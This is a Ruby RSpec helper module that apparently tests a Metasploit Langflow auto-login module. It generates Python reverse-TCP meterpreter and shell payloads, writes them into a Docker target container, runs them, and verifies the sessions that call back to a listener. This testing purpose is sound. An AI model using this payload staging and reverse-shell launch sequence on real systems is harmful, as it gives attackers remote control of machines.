# frozen_string_literal: true

require_relative '../langflow_execution/acceptance'
require_relative '../rsync_creds/native'

# Reuse the real Langflow process, public session API and persisted-row checks.
module LangflowAutoLoginTarget
  include RsyncCredentialTarget
  include Acceptance::LangflowExecution

  FAMILIES = {
    'staged' => ['python/meterpreter/reverse_tcp', 'meterpreter', { 'MeterpreterTryToFork' => true }],
    'nofork' => ['python/meterpreter/reverse_tcp', 'meterpreter', { 'MeterpreterTryToFork' => false }],
    'inline' => ['python/meterpreter_reverse_tcp', 'meterpreter', { 'MeterpreterTryToFork' => true }],
    'shell' => ['python/shell_reverse_tcp', 'shell', {}]
  }.freeze

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'langflow-auto-sdk.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def native(tag, action: 'verify')
    if action == 'health'
      result = super
      state = process_state
      expect(state.fetch('connections')).to include(include('state' => '01'))
      record('live-callback-state.jsonl', tag: tag, state: state)
      return result
    end

    output, error, status = Open3.capture3('python3', '-B', 'test/module_targets/langflow_auto_login/native.py', tag)
    record('native-probe-status.jsonl', tag: tag, exit: status.exitstatus, stdout: output, stderr: error)
    expect(status.success?).to be(true), output + error
    JSON.parse(output)
  end

  def call_owner(options = {}, **keywords)
    select_defaults = @default_pending && !keywords[:reuse]
    @default_pending = false
    offset = rpc('framework.instance_variable_get(:@langflow_auto_events).length')
    output = super(options, **keywords, select_defaults: select_defaults)
    executions = rpc("framework.instance_variable_get(:@langflow_auto_events).drop(#{offset}).select { |event| event[:event] == :call && event[:method] == :exploit }")
    record('owner-execution-options.jsonl', executions: executions)
    expect(executions).not_to be_empty
    if options.key?('MeterpreterTryToFork')
      expect(executions).to all(include('options' => include('MeterpreterTryToFork' => options.fetch('MeterpreterTryToFork'))))
    end
    output
  end

  def native_session(family)
    payload, type, extra = FAMILIES.fetch(family)
    attempt = { family: family, payload: payload, owner: 'exploit/multi/handler' }
    @rc[:attempts] << attempt
    source = "/tmp/module-target-langflow-native-script-#{Process.pid}-#{family}"
    proof_path = "/tmp/module-target-langflow-own-native-#{Process.pid}-#{family}"
    expect(target_exec('target', 'test', '!', '-e', source)).to eq('')
    source_owned = true
    expect(target_exec('target', 'test', '!', '-e', proof_path)).to eq('')
    proof_owned = true
    owner_offset = rpc('framework.instance_variable_get(:@langflow_auto_events).length')
    console_command('back')
    console_command('use exploit/multi/handler')
    {
      'PAYLOAD' => attempt.fetch(:payload), 'LHOST' => listener_host, 'LPORT' => 4492,
      'ReverseListenerBindAddress' => '0.0.0.0', 'ExitOnSession' => false, 'ListenerTimeout' => 45
    }.merge(type == 'meterpreter' ? { 'SessionCommunicationTimeout' => 10, 'SessionExpirationTimeout' => 90 } : {}).merge(extra).each { |key, value| expect(console_command("set #{key} #{value}")).not_to include('Unknown datastore option') }
    expect(console_command('run -j -z')).not_to include('[-]')
    generated = rpc("begin;job=framework.jobs.values.find{|entry|entry.ctx.first.fullname=='exploit/multi/handler'};raise 'Missing native handler' unless job;handler,payload=job.ctx;{payload:payload.refname,fork:payload.datastore['MeterpreterTryToFork'],encoded:Base64.strict_encode64(handler.payload.encoded)};end")
    expect(generated.fetch('payload')).to eq(attempt.fetch(:payload))
    expect(generated.fetch('fork')).to eq(extra.fetch('MeterpreterTryToFork')) if extra.key?('MeterpreterTryToFork')
    attempt[:generated] = generated
    code = Base64.strict_decode64(generated.fetch('encoded'))
    output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'exec', '-T', 'target', 'sh', '-c', 'cat > "$1"; chmod 600 "$1"; sha256sum "$1"', 'native-script', source, stdin_data: code)
    attempt[:install] = { stdout: output, stderr: error, exit: status.exitstatus }
    expect(status.success?).to be(true), error
    expect(output.split.first).to eq(Digest::SHA256.hexdigest(code))
    output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'exec', '-T', '-d', 'target', 'python', source)
    attempt[:launch] = { stdout: output, stderr: error, exit: status.exitstatus }
    expect(status.success?).to be(true), error
    metadata = rc_poll(45) do
      ready = File.readlines(@ready.fetch('ready_event_path')).filter_map do |line|
        JSON.parse(line).fetch('id')
      rescue JSON::ParserError
        nil # The asynchronous ready event may still be completing its line.
      end
      rpc('framework.sessions.map{|id,session|{id:id,type:session.type,owner:session.via_exploit,payload:session.via_payload,db_id:session.db_record&.id}}').find { |row| row['db_id'] && ready.include?(row.fetch('id')) }
    end
    attempt[:metadata] = metadata
    identifier = metadata.fetch('id')
    expect(metadata.values_at('type', 'owner', 'payload')).to eq([type, 'exploit/multi/handler', 'payload/' + attempt.fetch(:payload)])
    proof = rpc("LangflowSessionControl.proof(framework,#{identifier},#{proof_path.inspect},'langflow-native-session')")
    attempt[:proof] = proof
    expect(target_exec('target', 'cat', proof_path)).to eq('langflow-native-session')
    expect(target_exec('target', 'stat', '-c', '%u', proof_path).strip).to eq('1000')
    process = process_state.fetch('processes').find { |row| row.fetch('pid') == proof.fetch('pid') }
    expect(process).to include('uid' => '1000')
    expect(@baseline.fetch('processes').map { |row| row.fetch('pid') }).not_to include(process.fetch('pid'))
    expect(session_rows).to include(include('id' => metadata.fetch('db_id'), 'via_exploit' => 'exploit/multi/handler', 'via_payload' => 'payload/' + attempt.fetch(:payload)))
    expect(native('native-live-' + family, action: 'health')).to include('version' => '1.8.4', 'package' => 'Langflow')
    expect(rpc("framework.instance_variable_get(:@langflow_auto_events).drop(#{owner_offset})")).to eq([])
    attempt[:shutdown] = rpc("LangflowSessionControl.shutdown(framework,#{identifier})")
    rpc("framework.sessions[#{identifier}]&.kill;true")
    passed = true
  ensure
    primary = $ERROR_INFO
    begin
      console_command('sessions -K')
      console_command('jobs -K')
      [source_owned && source, proof_owned && proof_path].select { |path| path }.each do |path|
        target_exec('target', 'rm', '-f', '--', path)
        target_exec('target', 'test', '!', '-e', path)
      end
      poll(15) { idle }
      attempt[:closed_reports] = session_rows
      cleanup_ok = true
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      @rc[:cleanup_errors] << { type: e.class.name, message: e.message }
      raise unless primary
    ensure
      @rc[:calibrated] << family if passed && cleanup_ok
      rc_save
    end
  end
end
